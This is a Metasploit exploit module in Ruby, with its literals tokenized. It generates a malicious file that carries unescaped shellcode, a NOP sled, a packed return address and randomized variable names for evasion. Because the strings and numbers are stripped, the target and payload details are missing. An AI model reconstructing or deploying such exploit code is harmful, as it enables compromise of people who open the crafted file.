require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> , <str> ] ) , ] , self . class ) end def exploit shellcode = Rex :: Text . to_unescape ( payload . encoded , Rex :: Arch . endian ( target . arch ) ) nops = Rex :: Text . to_unescape ( make_nops ( <int> ) ) ret = Rex :: Text . uri_encode ( [ target . ret ] . pack ( <str> ) ) vname = rand_text_alpha ( rand ( <int> ) + <int> ) var_i = rand_text_alpha ( rand ( <int> ) + <int> ) rand1 = rand_text_alpha ( rand ( <int> ) + <int> ) rand2 = rand_text_alpha ( rand ( <int> ) + <int> ) rand3 = rand_text_alpha ( rand ( <int> ) + <int> ) rand4 = rand_text_alpha ( rand ( <int> ) + <int> ) rand5 = rand_text_alpha ( rand ( <int> ) + <int> ) rand6 = rand_text_alpha ( rand ( <int> ) + <int> ) rand7 = rand_text_alpha ( rand ( <int> ) + <int> ) rand8 = rand_text_alpha ( rand ( <int> ) + <int> ) content = <str> vname <str> rand1 <str> shellcode <str> rand2 <str> nops <str> rand3 <str> rand4 <str> rand3 <str> rand1 <str> rand2 <str> rand4 <str> rand2 <str> rand2 <str> rand5 <str> rand2 <str> rand4 <str> rand6 <str> rand2 <str> rand2 <str> rand4 <str> rand6 <str> rand4 <str> rand6 <str> rand6 <str> rand6 <str> rand5 <str> rand7 <str> var_i <str> var_i <str> var_i <str> rand7 <str> var_i <str> rand6 <str> rand1 <str> rand8 <str> var_i <str> var_i <str> var_i <str> rand8 <str> rand8 <str> ret <str> vname <str> rand8 <str> print_status ( <str> datastore [ <str> ] <str> ) file_create ( content ) end end 
